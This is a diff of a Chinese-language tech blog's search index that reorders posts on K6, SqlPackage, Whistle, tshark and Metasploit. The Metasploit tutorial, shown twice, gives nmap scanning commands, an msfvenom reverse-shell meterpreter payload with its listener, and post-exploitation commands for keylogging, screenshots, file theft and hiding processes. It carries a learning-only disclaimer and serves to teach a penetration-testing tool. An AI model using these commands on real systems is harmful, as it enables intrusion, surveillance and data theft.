-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.metasploit.com/">metasploit</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Tool</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Security</tag>
-        <tag>Metasploit</tag>
-        <tag>Nmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>K6 壓測可視化</title>
     <url>/2025/04/02/ToolK6Monitor/</url>
     <content><![CDATA[<h1 id="安裝-InfluxDB-儲存壓測資料"><a class="header-anchor" href="#安裝-InfluxDB-儲存壓測資料"></a>安裝 InfluxDB 儲存壓測資料</h1>
@@ -2487,6 +2417,76 @@ $env:K6_INFLUXDB_TOKEN='[初始TOKEN]' ;
       </tags>
   </entry>
   <entry>
+    <title>Metasploit 基本操作</title>
+    <url>/2024/06/01/ToolSecurityMetasploit/</url>
+    <content><![CDATA[<div class="note danger"><p>⚠️ 請注意，本範例僅供學習參考，請遵守相關法令，產生之行為與後果將由使用者自行負責</p>
+</div>
+<!-- 設定檔位置: ~/.msf4 -->
+<h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新設定</span></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
+<h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
+<h1 id="模組查詢"><a class="header-anchor" href="#模組查詢"></a>模組查詢</h1>
+<p>⭐ 更新可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+<p>⭐ 顯示可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用於繞過防毒軟體或安全防護機制的技術</span></span><br><span class="line">show evasion</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於取得會話後，在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br></pre></td></tr></table></figure>
+<p>⭐ 查找模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
+<p>⭐ 模組使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h1 id="滲透操作"><a class="header-anchor" href="#滲透操作"></a>滲透操作</h1>
+<p>⭐ 常用會話接口介紹</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">接口</th>
+<th style="text-align:left">說明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">command shell</td>
+<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
+</tr>
+<tr>
+<td style="text-align:left">meterpreter</td>
+<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
+</tr>
+<tr>
+<td style="text-align:left">vnc</td>
+<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
+</tr>
+</tbody>
+</table>
+<p>⭐ 創建 meterpreter 會話接口的 payload :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>⭐ 遠端執行 meterpreter payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+<h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
+<p>獲得會話接口後常用命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.metasploit.com/">metasploit</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Tool</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Security</tag>
+        <tag>Metasploit</tag>
+        <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 SqlPackage 備份資料庫</title>
     <url>/2024/07/25/ToolSqlPackage/</url>
     <content><![CDATA[<h1 id="安裝-SqlPackage"><a class="header-anchor" href="#安裝-SqlPackage"></a>安裝 SqlPackage</h1>
@@ -2525,34 +2525,6 @@ $env:K6_INFLUXDB_TOKEN='[初始TOKEN]' ;
         <tag>.Net</tag>
         <tag>Tool</tag>
         <tag>SqlPackage</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安裝 Whistle</title>
-    <url>/2023/01/20/ToolWhistleProxyInstall/</url>
-    <content><![CDATA[<h1 id="使用-Node-安裝-Whistle"><a class="header-anchor" href="#使用-Node-安裝-Whistle"></a>使用 Node 安裝 Whistle</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i -g whistle</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="啟動-Whistle"><a class="header-anchor" href="#啟動-Whistle"></a>啟動 Whistle</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 start</span><br></pre></td></tr></table></figure>
-<h1 id="查看-Whistle-狀態"><a class="header-anchor" href="#查看-Whistle-狀態"></a>查看 Whistle 狀態</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 status</span><br></pre></td></tr></table></figure>
-<h1 id="停止-Whistle"><a class="header-anchor" href="#停止-Whistle"></a>停止 Whistle</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 stop</span><br></pre></td></tr></table></figure>
-<h1 id="設定-Whistle-為-Proxy-的-Server"><a class="header-anchor" href="#設定-Whistle-為-Proxy-的-Server"></a>設定 Whistle 為 Proxy 的 Server</h1>
-<!-- <img src="/2023/01/20/ToolWhistleProxyInstall/Win10ProxySetting.png" class=""> -->
-<p><img src="Win10ProxySetting.png" alt="Win10ProxySetting"></p>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.npmjs.com/package/whistle">whistle npm</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Tool</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Whistle</tag>
       </tags>
   </entry>
   <entry>
@@ -2622,6 +2594,34 @@ $env:K6_INFLUXDB_TOKEN='[初始TOKEN]' ;
       </tags>
   </entry>
   <entry>
+    <title>安裝 Whistle</title>
+    <url>/2023/01/20/ToolWhistleProxyInstall/</url>
+    <content><![CDATA[<h1 id="使用-Node-安裝-Whistle"><a class="header-anchor" href="#使用-Node-安裝-Whistle"></a>使用 Node 安裝 Whistle</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i -g whistle</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="啟動-Whistle"><a class="header-anchor" href="#啟動-Whistle"></a>啟動 Whistle</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 start</span><br></pre></td></tr></table></figure>
+<h1 id="查看-Whistle-狀態"><a class="header-anchor" href="#查看-Whistle-狀態"></a>查看 Whistle 狀態</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 status</span><br></pre></td></tr></table></figure>
+<h1 id="停止-Whistle"><a class="header-anchor" href="#停止-Whistle"></a>停止 Whistle</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w2 stop</span><br></pre></td></tr></table></figure>
+<h1 id="設定-Whistle-為-Proxy-的-Server"><a class="header-anchor" href="#設定-Whistle-為-Proxy-的-Server"></a>設定 Whistle 為 Proxy 的 Server</h1>
+<!-- <img src="/2023/01/20/ToolWhistleProxyInstall/Win10ProxySetting.png" class=""> -->
+<p><img src="Win10ProxySetting.png" alt="Win10ProxySetting"></p>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.npmjs.com/package/whistle">whistle npm</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Tool</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Whistle</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tshark 基本操作</title>
     <url>/2021/10/23/ToolWiresharkCommand/</url>
     <content><![CDATA[<h1 id="安裝-Wireshark"><a class="header-anchor" href="#安裝-Wireshark"></a>安裝 Wireshark</h1>
@@ -2650,7 +2650,7 @@ $env:K6_INFLUXDB_TOKEN='[初始TOKEN]' ;
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-r</span> https_traffic.pcapng <span class="literal">-o</span> tls.keylog_file:<span class="string">&quot;C:\path\to\sslkeys.log&quot;</span></span><br></pre></td></tr></table></figure>
 <h1 id="解析-Body"><a class="header-anchor" href="#解析-Body"></a>解析 Body</h1>
 <p>解析 HTTP Body，存入變數 hex</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hex</span> = tshark <span class="literal">-r</span> https_traffic.pcapng `</span><br><span class="line">			  <span class="literal">-Y</span> <span class="string">&#x27;http.request.method == &quot;[HTTP的方法]&quot; &amp;&amp; http.request.uri == \&quot;[URL連結]\&quot;&#x27;</span> `</span><br><span class="line">              <span class="literal">-T</span> fields <span class="literal">-e</span> http.file_data `</span><br><span class="line">              <span class="literal">-o</span> tls.keylog_file:<span class="string">&quot;C:\path\to\sslkeys.log&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hex</span> = tshark <span class="literal">-r</span> https_traffic.pcapng `</span><br><span class="line">              <span class="literal">-Y</span> <span class="string">&#x27;http.request.method == &quot;[HTTP的方法]&quot; &amp;&amp; http.request.uri == \&quot;[URL連結]\&quot;&#x27;</span> `</span><br><span class="line">              <span class="literal">-T</span> fields <span class="literal">-e</span> http.file_data `</span><br><span class="line">              <span class="literal">-o</span> tls.keylog_file:<span class="string">&quot;C:\path\to\sslkeys.log&quot;</span></span><br></pre></td></tr></table></figure>
 <p>建立方法解析 Hex</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Convert-HexToUtf8String</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$hex</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移除所有非十六進位字元（保險做法）</span></span><br><span class="line">    <span class="variable">$cleanHex</span> = <span class="variable">$hex</span> <span class="operator">-replace</span> <span class="string">&#x27;[^0-9a-fA-F]&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cleanHex</span>.Length % <span class="number">2</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;Hex string 長度為奇數，無法正確解碼。&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$cleanHex</span>.Length; <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">        [<span class="type">Convert</span>]::ToByte(<span class="variable">$cleanHex</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$bytes</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Hex 轉文字</p>
